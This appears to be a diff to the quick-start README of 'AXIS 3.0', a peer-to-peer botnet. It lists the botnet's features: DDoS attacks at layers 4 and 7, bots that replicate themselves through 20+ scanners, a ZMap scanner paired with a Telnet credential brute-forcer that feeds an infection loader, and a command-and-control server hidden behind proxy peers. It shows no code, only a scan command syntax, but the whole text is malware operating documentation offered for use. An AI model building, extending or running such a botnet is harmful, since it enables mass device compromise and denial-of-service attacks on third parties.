@@ -1,11 +1,20 @@
-# AXIS 3.0 P2P - Quick Start Guide (Torrent Edition)
+# AXIS 3.0 - Quick Start Guide
+
+## What's New in 3.0
+
+1. **DNS Resolution on Bots**: All L4 attacks resolve domains via 7 rotating DNS servers
+2. **URL-Based L7 Attacks**: Bots parse URLs automatically - no `domain=x` needed
+3. **Integrated Scanners**: C2 includes ZMap + Telnet bruter with auto-deployment
+4. **Scanner Commands**: `scan <startIP> <endIP> [port]` from admin panel
+5. **C2 Renamed**: `cnc/` directory renamed to `C2/`
 
 ## How It Works
 
 1. **Torrent-style distribution**: Every bot downloads ALL binaries from the P2P network and becomes a seeder.
 2. **Self-replication**: Every bot runs 20+ scanners to find and infect new devices.
-3. **CNC via proxies**: C&C joins the P2P network through proxy peers to stay hidden.
-4. **Auto-seed control**: CNC stops seeding binaries at 200 bots, resumes below 200.
+3. **C2 via proxies**: C2 joins the P2P network through proxy peers to stay hidden.
+4. **Auto-seed control**: C2 stops seeding binaries at 200 bots, resumes below 200.
+5. **Integrated scanning**: ZMap finds open ports, Telnet bruter tries credentials, results auto-feed to loader.
 
 ## 1. Build Everything
 
